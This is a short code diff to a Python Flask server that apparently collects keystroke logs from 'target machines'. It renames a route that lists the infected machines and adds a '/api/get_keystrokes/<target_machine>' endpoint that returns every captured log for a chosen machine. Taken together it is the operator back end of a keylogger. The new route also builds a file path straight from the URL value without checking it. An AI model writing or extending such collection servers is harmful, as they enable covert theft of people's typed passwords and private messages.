@@ -33,11 +33,27 @@ def upload():
         f.write(log_data)
 
     return jsonify({"status": "success", "file": file_path}), 200
-@app.route('/api/machines', methods=['GET'])
+@app.route('/api/get_target_machines_list', methods=['GET'])
 def get_targget_machines_list():
     """Returns a list of all machines that have logged data"""
     machines = os.listdir(DATA_FOLDER)
     return jsonify({"machines": machines})
+
+@app.route('/api/get_keystrokes/<target_machine>', methods=['GET'])
+
+
+def get_target_machine_key_strokes(target_machine):
+    """Returns all logs for the specified machine"""
+    machine_folder = os.path.join(DATA_FOLDER, target_machine)
+    if not os.path.exists(machine_folder):
+        return jsonify({"error": "Machine not found"}), 404
+
+    data = ""
+    for file in os.listdir(machine_folder):
+        with open(os.path.join(machine_folder, file), "r", encoding="utf-8") as f:
+            data += f.read()
+
+    return jsonify({target_machine: data})
 
 
 if __name__ == "__main__":
